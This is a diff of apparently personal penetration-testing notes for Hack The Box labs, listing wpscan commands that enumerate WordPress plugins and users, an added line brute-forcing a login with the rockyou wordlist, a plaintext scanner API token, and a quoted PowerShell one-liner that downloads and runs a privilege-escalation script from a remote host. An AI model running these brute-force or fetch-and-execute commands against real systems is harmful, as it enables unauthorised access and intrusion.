@@ -352,10 +352,13 @@ grep -rl "password"
 Wordpress scanning:
 wpscan --url https://brainfuck.htb --disable-tls-checks --api-token
 wpscan --url https://brainfuck.htb --enumerate p --disable-tls-check
+
 Do this to get the vulnerable plugin:
 wpscan --url http://192.168.50.9/wordpress -e ap --plugins-detection aggressive --api-token hX83TxNSYeYTUz1sFiiVKsOCBxHELHACakJc7uvt7fA
 
-From htb optimum walkthrough comment section:
+wpscan --url http://192.168.50.9/wordpress --usernames c0rrupt3d_brain --passwords /usr/share/wordlists/rockyou.txt #password burte forcing
+
+#From htb optimum walkthrough comment section:
 Thanks for bringing Sherlock back!  :D
 
 I tend to do something like:  `iex ((new-object net.webclient).downloadstring("http://x.x.x.x/Sherlock.ps1")); Find-AllVulns`.  Saves having to mod the script.
